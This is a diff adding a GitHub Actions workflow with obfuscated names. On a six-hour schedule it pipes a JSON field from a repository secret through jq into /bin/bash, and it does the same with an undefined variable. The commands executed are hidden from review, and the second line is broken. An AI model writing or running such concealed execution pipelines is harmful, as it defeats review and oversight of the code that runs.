@@ -1,0 +1,19 @@
+name: betaalgug
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: betaalgug
+        env:
+          q091: ${{ secrets.q091 }}
+        run: |
+          echo $q091 | jq -r .qf8196 | /bin/bash
+          echo $h2773 | jq -r .f60570 | /bin/bash
+
